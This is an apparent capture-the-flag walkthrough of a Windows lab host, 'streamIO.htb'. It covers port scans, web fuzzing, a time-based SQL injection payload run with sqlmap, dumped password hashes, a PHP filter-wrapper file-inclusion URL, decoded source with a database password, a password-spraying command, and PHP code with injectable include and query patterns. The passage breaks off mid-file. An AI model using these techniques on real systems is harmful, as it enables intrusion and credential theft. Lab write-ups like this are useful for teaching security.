### Host: 10.10.11.158

# Content

-   SSL Certificate Inspection
-   Fuzzing by abusing web features with wfuzz
-   SQLi time-based
-   Local File Inclusion - Base64 Wrapper (Reading PHP files)
-   Source code review - PHP
-   Advanced use of wrappers - PHP
-   Port Forwarding - Chisel
-   MSSQL enumeration (authenticated)
-   Extracting Credentials from Firefox Profile
-   Bloodhound Enumeration
-   Password Spraying - Crackmapexec
-   Read LAPS Password (LAPS.py)

# Reconnaissance

Typical SYN scan to enumerate all the open ports:

```bash
sudo nmap -v -sS -sV -p- --min-rate=5400 10.10.11.158
Starting Nmap 7.92 ( <https://nmap.org> ) at 2022-06-28 20:33 EDT
NSE: Loaded 45 scripts for scanning.
Initiating Ping Scan at 20:33
Scanning 10.10.11.158 [4 ports]
Completed Ping Scan at 20:33, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:33
Completed Parallel DNS resolution of 1 host. at 20:33, 0.01s elapsed
Initiating SYN Stealth Scan at 20:33
Scanning 10.10.11.158 [65535 ports]
Discovered open port 80/tcp on 10.10.11.158
Discovered open port 139/tcp on 10.10.11.158
Discovered open port 445/tcp on 10.10.11.158
Discovered open port 443/tcp on 10.10.11.158
Discovered open port 135/tcp on 10.10.11.158
Discovered open port 53/tcp on 10.10.11.158
Discovered open port 389/tcp on 10.10.11.158
Discovered open port 49667/tcp on 10.10.11.158
Discovered open port 49701/tcp on 10.10.11.158
Discovered open port 49674/tcp on 10.10.11.158
Discovered open port 3269/tcp on 10.10.11.158
Discovered open port 88/tcp on 10.10.11.158
Discovered open port 464/tcp on 10.10.11.158
Discovered open port 49673/tcp on 10.10.11.158
Discovered open port 5985/tcp on 10.10.11.158
Discovered open port 9389/tcp on 10.10.11.158
Discovered open port 593/tcp on 10.10.11.158
Discovered open port 636/tcp on 10.10.11.158
Discovered open port 3268/tcp on 10.10.11.158
Completed SYN Stealth Scan at 20:34, 36.75s elapsed (65535 total ports)
Initiating Service scan at 20:34
Scanning 19 services on 10.10.11.158
Completed Service scan at 20:35, 56.83s elapsed (19 services on 1 host)
NSE: Script scanning 10.10.11.158.
Initiating NSE at 20:35
Completed NSE at 20:35, 1.78s elapsed
Initiating NSE at 20:35
Completed NSE at 20:35, 1.37s elapsed
Nmap scan report for 10.10.11.158
Host is up (0.094s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-29 07:34:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 97.41 seconds
           Raw packets sent: 196593 (8.650MB) | Rcvd: 41 (1.788KB)
```

More advanced scan once that we get the full list of the ports:

```bash
nmap -sCV -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49698 -vvv -oN targeted 10.10.11.158
Nmap scan report for 10.10.11.158
Host is up, received echo-reply ttl 127 (0.18s latency).
Scanned at 2022-06-28 19:41:45 CDT for 102s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-06-29 07:41:54Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Issuer: commonName=streamIO/countryName=EU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-02-22T07:03:28
| Not valid after:  2022-03-24T07:03:28
| MD5:   b99a 2c8d a0b8 b10a eefa be20 4abd ecaf
| SHA-1: 6c6a 3f5c 7536 61d5 2da6 0e66 75c0 56ce 56e4 656d
| -----BEGIN CERTIFICATE-----
| MIIDYjCCAkqgAwIBAgIUbdDRZxR55nbfMxJzBHWVXcH83kQwDQYJKoZIhvcNAQEL
| BQAwIDELMAkGA1UEBhMCRVUxETAPBgNVBAMMCHN0cmVhbUlPMB4XDTIyMDIyMjA3
| MDMyOFoXDTIyMDMyNDA3MDMyOFowIDELMAkGA1UEBhMCRVUxETAPBgNVBAMMCHN0
| cmVhbUlPMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2QSO8noWDU+A
| MYuhSMrB2mA+V7W2gwMdTHxYK0ausnBHdfQ4yGgAs7SdyYKXf8fA502x4LvYwgmd
| 67QtQdYtsTSv63SlnEW3zjJyu/dRW0cwMfBCqyiLgAScrxb/6HOhpnOAzk0DdBWE
| 2vobsSSAh+cDHVSuSbEBLqJ0GEL4hcggHhQq6HLRmmrb0wGjL1WIwjQ8cCWcFzzw
| 5Xe3gEe+aHK245qZKrZtHuXelFe72/nbF8VFiukkaBMgoh6VfpM66nMzy+KeLfhP
| FkxBt6osGUHwSnocJknc7t+ySRVTACAMPjbbPGEl4hvNEcZpepep6jD6qgi4k7bL
| 82Nu2AeSIQIDAQABo4GTMIGQMB0GA1UdDgQWBBRf0ALWCgvVfRgijR2I0KY0uRjY
| djAfBgNVHSMEGDAWgBRf0ALWCgvVfRgijR2I0KY0uRjYdjAPBgNVHRMBAf8EBTAD
| AQH/MCsGA1UdEQQkMCKCDHN0cmVhbUlPLmh0YoISd2F0Y2guc3RyZWFtSU8uaHRi
| MBAGA1UdIAQJMAcwBQYDKgMEMA0GCSqGSIb3DQEBCwUAA4IBAQCCAFvDk/XXswL4
| cP6nH8MEkdEU7yvMOIPp+6kpgujJsb/Pj66v37w4f3us53dcoixgunFfRO/qAjtY
| PNWjebXttLHER+fet53Mu/U8bVQO5QD6ErSYUrzW/l3PNUFHIewpNg09gmkY4gXt
| oZzGN7kvjuKHm+lG0MunVzcJzJ3WcLHQUcwEWAdSGeAyKTfGNy882YTUiAC3p7HT
| 61PwCI+lO/OU52VlgnItRHH+yexBTLRB+Oa2UhB7GnntQOR1S5g497Cs3yAciST2
| JaKhcCnBY1cWqUSAm56QK3mz55BNPcOUHLhrFLjIaWRVx8Ro8QOCWcxkTfVcKcR+
| DSJTOJH8
|_-----END CERTIFICATE-----
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2022-06-29T07:43:27+00:00; +7h00m02s from scanner time.
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49698/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s
| smb2-time: 
|   date: 2022-06-29T07:42:46
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 18376/tcp): CLEAN (Timeout)
|   Check 2 (port 16283/tcp): CLEAN (Timeout)
|   Check 3 (port 16789/udp): CLEAN (Timeout)
|   Check 4 (port 25119/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
# Nmap done at Tue Jun 28 19:43:27 2022 -- 1 IP address (1 host up) scanned in 103.28 seconds
```

Enumerating port tcp-80 we found nothing, then we proceed to go to port tcp-443 https and we found a web page, as we can see its certificate is only valid for streamio.htb and watch.stream.io:

![[Pasted image 20220709034330.png]]

We then proceed to create the entry for the /etc/hosts file, and we are now able to see both web pages:

**streamio.htb:**

![[Pasted image 20220709034346.png]]

**watch.streamio.htb**

![[Pasted image 20220709034358.png]]

We start to enumerate with Wfuzz to find possible subdomains and/or virtual hosts: ^a1b013

```bash
wfuzz -c -t 200 --hc 404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://streamio.htb/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: <https://streamio.htb/FUZZ>
Total requests: 220549

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                
=====================================================================

000000005:   301        1 L      10 W       151 Ch      "images"                                                               
000000003:   200        394 L    915 W      13497 Ch    "?static=1"                                                            
000000192:   301        1 L      10 W       151 Ch      "Images"                                                               
**000000248:   301        1 L      10 W       150 Ch      "admin"**                                                                
000000539:   301        1 L      10 W       148 Ch      "css"                                                                  
000000942:   301        1 L      10 W       147 Ch      "js"                                                                   
000002760:   301        1 L      10 W       150 Ch      "fonts"                                                                
000003662:   301        1 L      10 W       151 Ch      "IMAGES"                                                               
000005571:   301        1 L      10 W       150 Ch      "Fonts"                                                                
000006087:   301        1 L      10 W       150 Ch      "Admin"                                                                
000006993:   400        80 L     276 W      3420 Ch     "*checkout*"                                                           
000008464:   301        1 L      10 W       148 Ch      "CSS"                                                                  
000009126:   301        1 L      10 W       147 Ch      "JS"
```

As we can see there is an admin folder, by entering into it we can see the legend:

![[Pasted image 20220709034429.png]]

Other than that, no further sub directories were found, let’s then enumerate possible virtual hosts that could give us more info about this web page:

```bash
wfuzz -c -t 200 --hh 703 --hc 403,404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H 'Host: FUZZ.streamio.htb' -u <https://streamio.htb/>
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: <https://streamio.htb/>
Total requests: 220549

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                
=====================================================================

000000003:   400        6 L      26 W       334 Ch      "?static=1"                                                            
000001084:   400        6 L      26 W       334 Ch      "-"                                                                    
000001712:   200        78 L     245 W      2829 Ch     "watch"                                                                
000003779:   400        6 L      26 W       334 Ch      "%20"
```

Other than errors 404 and the already known subdomain watch, nothing interesting, so we proceed to enumerate the web page by checking its elements and source code, we identified an SQLi under **streamio.htb** more specifically on its login web page, this is a SQLi time-based as shown by the tool sqlmap: ^6ca422

```bash
❯ sudo sqlmap -u "<https://streamio.htb/login.php>" --data "username=&password=" -p username --dbs
passwd: 
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   <https://sqlmap.org>

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:30:47 /2022-07-07/

[02:30:47] [WARNING] provided value for parameter 'username' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[02:30:47] [INFO] resuming back-end DBMS 'microsoft sql server' 
[02:30:47] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=dgev1j4edl3...bl4n5u4d0u'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: username=';WAITFOR DELAY '0:0:5'--&password=
---
[02:32:13] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2019 or 10 or 2016
web application technology: PHP, PHP 7.2.26, Microsoft IIS 10.0
back-end DBMS: Microsoft SQL Server 2019
[02:32:13] [INFO] fetching database names
[02:32:13] [INFO] fetching number of databases
[02:32:13] [INFO] resumed: 6
[02:32:13] [INFO] resumed: model
[02:32:13] [INFO] resumed: msdb
[02:32:13] [INFO] resumed: STREAMIO
[02:32:13] [INFO] resumed: streamio_backup
[02:32:13] [INFO] resumed: tempdb
**[02:32:13] [WARNING] (case) time-based comparison requires larger statistical model, please wait................**                       
[02:33:10] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
.............. (done)
[02:33:37] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[02:33:37] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[02:33:47] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
**available databases [5]:
[*] model
[*] msdb
[*] STREAMIO
[*] streamio_backup
[*] tempdb**

[02:33:47] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/streamio.htb'

[*] ending @ 02:33:47 /2022-07-07/
```

And we get the following table with a lot of useful users, one in particular catches our attention (yoshihide):

```bash
---
Parameter: username (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: username=';WAITFOR DELAY '0:0:5'--&password=
---
web server operating system: Windows 10 or 2019 or 2016
web application technology: Microsoft IIS 10.0, PHP, PHP 7.2.26
back-end DBMS: Microsoft SQL Server 2019
Database: STREAMIO
Table: users
[18 entries]
+--------+----------+----------------------------------+-------------------------+
| id     | is_staff | password                         | username                |
+--------+----------+----------------------------------+-------------------------+
| 3      | 1        | c660060492d9edcaa8332d89c99c9239 | James                   |
| 4      | 1        | 925e5408ecb67aea449373d668b7359e | Theodore                |
| 5      | 1        | 083ffae904143c4796e464dac33c1f7d | Samantha                |
| 6      | 1        | 08344b85b329d7efd611b7a7743e8a09 | Lauren                  |
| 7      | 1        | d62be0dc82071bccc1322d64ec5b6c51 | William                 |
| 8      | 1        | f87d3c0d6c8fd686aacc6627f1f493a5 | Sabrina                 |
| 9      | 1        | f03b910e2bd0313a23fdd7575f34a694 | Robert                  |
| 10     | 1        | 3577c47eb1e12c8ba021611e1280753c | Thane                   |
| 11     | 1        | 35394484d89fcfdb3c5e447fe749d213 | Carmon                  |
| 12     | 1        | 54c88b2dbd7b1a84012fabc1a4c73415 | Barry                   |
| 13     | 1        | fd78db29173a5cf701bd69027cb9bf6b | Oliver                  |
| 14     | 1        | b83439b16f844bd6ffe35c02fe21b3c0 | Michelle                |
| 15     | 1        | 0cfaaaafb559f081df2befbe66686de0 | Gloria                  |
| 16     | 1        | b22abb47a02b52d5dfa27fb0b534f693 | Victoria                |
| 17     | 1        | 1c2b3d8270321140e5153f6637d3ee53 | Alexendra               |
| 18     | 1        | 22ee218331afd081b0dcd8115284bae3 | Baxter                  |
| 19     | 1        | ef8f3d30a856cf166fb8215aca93e9ff | Clara                   |
| 20     | 1        | 3961548825e3e21df5646cafe11c6c76 | Barbra                  |
| 21     | 1        | b779ba15cedfd22a023c4d8bcf5f2332 | yoshihide               |
+--------+----------+----------------------------------+-------------------------+
```

Then, this credentials can be used on the following web page:

https://streamio.htb/login.php

![[Pasted image 20220709034453.png]]

Then grab the cookie in order to fuzz again the web page as the user yoshihide by proxying the request:

![[Pasted image 20220709034506.png]]

After that we’ll be able to see the admin web page with wfuzz by using its cookie: ^8b6d87

```bash
wfuzz -c -t 200 --hh 703 --hc 404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 'PHPSESSID=b4l3qrn1urotb80r5qbsvmrpge' -u https://streamio.htb/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: <https://streamio.htb/FUZZ>
Total requests: 220549

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                
=====================================================================

000000003:   200        394 L    915 W      13499 Ch    "?static=1"                                                            
000000192:   301        1 L      10 W       151 Ch      "Images"                                                               
000000005:   301        1 L      10 W       151 Ch      "images"                                                               
000000248:   301        1 L      10 W       150 Ch      "admin"                                                                
000000539:   301        1 L      10 W       148 Ch      "css"                                                                  
000000942:   301        1 L      10 W       147 Ch      "js"                                                                   
000002760:   301        1 L      10 W       150 Ch      "fonts"                                                                
000003662:   301        1 L      10 W       151 Ch      "IMAGES"
```

And we have access to the admin panel:

![[Pasted image 20220709034526.png]]

Then as we can see every page inside the admin panel modifies the URL as follows:

![[Pasted image 20220709034539.png]]

![[Pasted image 20220709034552.png]]

![[Pasted image 20220709034602.png]]

![[Pasted image 20220709034611.png]]

An interesting idea is to fuzz the parameter and review if we can get new ones: ^f42c86

```bash
wfuzz -c -t 200 --hw 131 --hc 404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 'PHPSESSID=b4l3qrn1urotb80r5qbsvmrpge' -u https://streamio.htb/admin/\\?FUZZ=
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://streamio.htb/admin/?FUZZ=
Total requests: 220549

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                
=====================================================================

000000114:   200        62 L     160 W      2073 Ch     "user"                                                                 
000000234:   200        398 L    916 W      12484 Ch    "staff"                                                                
000001050:   200        10790 L  25878 W    320235 Ch   "movie"                                                                
000005700:   200        49 L     137 W      1712 Ch     "debug"                                                                

Total time: 407.6945
Processed Requests: 220549
Filtered Requests: 220545
Requests/sec.: 540.9662
```

^6ae02d

On this cases where PHP is being used and a parameter is within the url is to try to exploit a Local File Inclusion by using wrappers, then we are able to see that we can enumerate files with the following URL: ^c6abe1

```
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php
```

![[Pasted image 20220709034630.png]]

As this is the file index.php, we echo this output then decode it as base64:

```bash
echo "onlyPD9waHAKZGVmaW5lKCdpbmNsdWRlZCcsdHJ1ZSk7CnNlc3Npb25fc3RhcnQoKTsKaWYoIWlzc2V0KCRfU0VTU0lPTlsnYWRtaW4nXSkpCnsKCWhlYWRlcignSFRUUC8xLjEgNDAzIEZvcmJpZGRlbicpOwoJZGllKCI8aDE+Rk9SQklEREVOPC9oMT4iKTsKfQokY29ubmVjdGlvbiA9IGFycmF5KCJEYXRhYmFzZSI9PiJTVFJFQU1JTyIsICJVSUQiID0+ICJkYl9hZG1pbiIsICJQV0QiID0+ICdCMUBoeDMxMjM0NTY3ODkwJyk7CiRoYW5kbGUgPSBzcWxzcnZfY29ubmVjdCgnKGxvY2FsKScsJGNvbm5lY3Rpb24pOwoKPz4KPCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KCTxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KCTx0aXRsZT5BZG1pbiBwYW5lbDwvdGl0bGU+Cgk8bGluayByZWwgPSAiaWNvbiIgaHJlZj0iL2ltYWdlcy9pY29uLnBuZyIgdHlwZSA9ICJpbWFnZS94LWljb24iPgoJPCEtLSBCYXNpYyAtLT4KCTxtZXRhIGNoYXJzZXQ9InV0Zi04IiAvPgoJPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIiAvPgoJPCEtLSBNb2JpbGUgTWV0YXMgLS0+Cgk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iIC8+Cgk8IS0tIFNpdGUgTWV0YXMgLS0+Cgk8bWV0YSBuYW1lPSJrZXl3b3JkcyIgY29udGVudD0iIiAvPgoJPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IiIgLz4KCTxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iIiAvPgoKPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L25wbS9ib290c3RyYXBANS4xLjMvZGlzdC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCIgaW50ZWdyaXR5PSJzaGEzODQtMUJtRTRrV0JxNzhpWWhGbGR2S3VoZlRBVTZhdVU4dFQ5NFdySGZ0akRickNFWFNVMW9Cb3F5bDJRdlo2aklXMyIgY3Jvc3NvcmlnaW49ImFub255bW91cyI+CjxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2Jvb3RzdHJhcEA1LjEuMy9kaXN0L2pzL2Jvb3RzdHJhcC5idW5kbGUubWluLmpzIiBpbnRlZ3JpdHk9InNoYTM4NC1rYTdTazBHbG40Z210ejJNbFFuaWtUMXdYZ1lzT2crT01odVArSWxSSDlzRU5CTzBMUm41cSs4bmJUb3Y0KzFwIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KCgk8IS0tIEN1c3RvbSBzdHlsZXMgZm9yIHRoaXMgdGVtcGxhdGUgLS0+Cgk8bGluayBocmVmPSIvY3NzL3N0eWxlLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiAvPgoJPCEtLSByZXNwb25zaXZlIHN0eWxlIC0tPgoJPGxpbmsgaHJlZj0iL2Nzcy9yZXNwb25zaXZlLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiAvPgoKPC9oZWFkPgo8Ym9keT4KCTxjZW50ZXIgY2xhc3M9ImNvbnRhaW5lciI+CgkJPGJyPgoJCTxoMT5BZG1pbiBwYW5lbDwvaDE+CgkJPGJyPjxocj48YnI+CgkJPHVsIGNsYXNzPSJuYXYgbmF2LXBpbGxzIG5hdi1maWxsIj4KCQkJPGxpIGNsYXNzPSJuYXYtaXRlbSI+CgkJCQk8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ij91c2VyPSI+VXNlciBtYW5hZ2VtZW50PC9hPgoJCQk8L2xpPgoJCQk8bGkgY2xhc3M9Im5hdi1pdGVtIj4KCQkJCTxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iP3N0YWZmPSI+U3RhZmYgbWFuYWdlbWVudDwvYT4KCQkJPC9saT4KCQkJPGxpIGNsYXNzPSJuYXYtaXRlbSI+CgkJCQk8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ij9tb3ZpZT0iPk1vdmllIG1hbmFnZW1lbnQ8L2E+CgkJCTwvbGk+CgkJCTxsaSBjbGFzcz0ibmF2LWl0ZW0iPgoJCQkJPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSI/bWVzc2FnZT0iPkxlYXZlIGEgbWVzc2FnZSBmb3IgYWRtaW48L2E+CgkJCTwvbGk+CgkJPC91bD4KCQk8YnI+PGhyPjxicj4KCQk8ZGl2IGlkPSJpbmMiPgoJCQk8P3BocAoJCQkJaWYoaXNzZXQoJF9HRVRbJ2RlYnVnJ10pKQoJCQkJewoJCQkJCWVjaG8gJ3RoaXMgb3B0aW9uIGlzIGZvciBkZXZlbG9wZXJzIG9ubHknOwoJCQkJCWlmKCRfR0VUWydkZWJ1ZyddID09PSAiaW5kZXgucGhwIikgewoJCQkJCQlkaWUoJyAtLS0tIEVSUk9SIC0tLS0nKTsKCQkJCQl9IGVsc2UgewoJCQkJCQlpbmNsdWRlICRfR0VUWydkZWJ1ZyddOwoJCQkJCX0KCQkJCX0KCQkJCWVsc2UgaWYoaXNzZXQoJF9HRVRbJ3VzZXInXSkpCgkJCQkJcmVxdWlyZSAndXNlcl9pbmMucGhwJzsKCQkJCWVsc2UgaWYoaXNzZXQoJF9HRVRbJ3N0YWZmJ10pKQoJCQkJCXJlcXVpcmUgJ3N0YWZmX2luYy5waHAnOwoJCQkJZWxzZSBpZihpc3NldCgkX0dFVFsnbW92aWUnXSkpCgkJCQkJcmVxdWlyZSAnbW92aWVfaW5jLnBocCc7CgkJCQllbHNlIAoJCQk/PgoJCTwvZGl2PgoJPC9jZW50ZXI+CjwvYm9keT4KPC9odG1sPg==" | base64 -d > index.php
```

The result is the code of the web page, it contains credentials for the database:

```php
<?php
define('included',true);
session_start();
if(!isset($_SESSION['admin']))
{
	header('HTTP/1.1 403 Forbidden');
	die("<h1>FORBIDDEN</h1>");
}
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Admin panel</title>
	<link rel = "icon" href="/images/icon.png" type = "image/x-icon">
	<!-- Basic -->
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<!-- Mobile Metas -->
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
	<!-- Site Metas -->
	<meta name="keywords" content="" />
	<meta name="description" content="" />
	<meta name="author" content="" />

<link href="<https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css>" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
<script src="<https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js>" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>

	<!-- Custom styles for this template -->
	<link href="/css/style.css" rel="stylesheet" />
	<!-- responsive style -->
	<link href="/css/responsive.css" rel="stylesheet" />

</head>
<body>
	<center class="container">
		<br>
		<h1>Admin panel</h1>
		<br><hr><br>
		<ul class="nav nav-pills nav-fill">
			<li class="nav-item">
				<a class="nav-link" href="?user=">User management</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="?staff=">Staff management</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="?movie=">Movie management</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="?message=">Leave a message for admin</a>
			</li>
		</ul>
		<br><hr><br>
		<div id="inc">
			<?php
				if(isset($_GET['debug']))
				{
					echo 'this option is for developers only';
					if($_GET['debug'] === "index.php") {
						die(' ---- ERROR ----');
					} else {
						include $_GET['debug'];
					}
				}
				else if(isset($_GET['user']))
					require 'user_inc.php';
				else if(isset($_GET['staff']))
					require 'staff_inc.php';
				else if(isset($_GET['movie']))
					require 'movie_inc.php';
				else 
			?>
		</div>
	</center>
</body>
</html>
```

As we are unable to exploit this credentials, even with crackmapexec by trying to exploit a password sprayer attack: ^11d8df
```bash
crackmapexec smb 10.10.11.158 -u users -p creds
```

![[Pasted image 20220709034656.png]]

And as no DB port is open (tcp-1433 for mssql) then we should focus on keep exploiting the LFI vulnerability, by fuzzing interesting files that could be inside the server: ^10fd58

```bash
wfuzz -c -t 200 --hh 1712 --hc 404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 'PHPSESSID=b4l3qrn1urotb80r5qbsvmrpge' -u https://streamio.htb/admin/\\?debug=php://filter/convert.base64\\-encode/resource=FUZZ.php
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: <https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=FUZZ.php>
Total requests: 220549

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                
=====================================================================

000000004:   200        49 L     137 W      4916 Ch     "index"                                                                
000000648:   200        49 L     137 W      4916 Ch     "Index"                                                                
000001857:   200        49 L     137 W      1712 Ch     "shipping"                                                             
**000002563:   200        49 L     137 W      5788 Ch     "master"**                                                               
000005074:   200        49 L     137 W      4916 Ch     "INDEX"
```

We found an interesting file within the server that is called master.php, its content is:

```php
<h1>Movie managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
if(isset($_POST['movie_id']))
{
$query = "delete from movies where id = ".$_POST['movie_id'];
